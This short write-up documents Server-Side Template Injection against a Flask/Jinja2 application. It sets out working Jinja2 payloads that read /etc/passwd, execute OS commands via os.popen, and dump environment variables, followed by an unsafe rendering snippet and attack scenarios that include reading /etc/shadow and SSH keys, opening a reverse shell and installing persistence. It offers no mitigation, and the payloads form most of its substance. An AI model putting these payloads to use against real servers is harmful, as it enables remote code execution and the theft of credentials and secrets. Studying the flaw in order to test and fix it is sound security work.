# Server-Side Template Injection (SSTI) Payloads Documentation

## Vulnerability Analysis

- **Target Application**: Flask/Jinja2 Template Injection
- **Vulnerability Type**: Server-Side Template Injection
- **Attack Vector**: Unprotected template string interpolation

## Successful Payloads

### 1. File Read Payload

```python
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**Impact**: Reads system password file

### 2. Command Execution

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Impact**: Executes system commands

### 3. Environment Variables

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').environ }}
```

**Impact**: Reveals sensitive environment variables

## Root Cause Analysis

### Unsafe Template Rendering

```python
template = f'Hello, {{ {user_input} }}!'
```

- No Input Sanitization
- Dangerous Function Usage (`render_template_string`)

## Attack Scenarios

### Scenario 1: Data Exfiltration

- Read sensitive files (`/etc/passwd`, `/etc/shadow`)
- Access application source code
- Read configuration files

### Scenario 2: System Compromise

- Execute arbitrary commands
- Gain reverse shell
- Install persistence mechanisms

### Scenario 3: Privilege Escalation

- Read SSH keys
- Access restricted files
- Modify system configurations
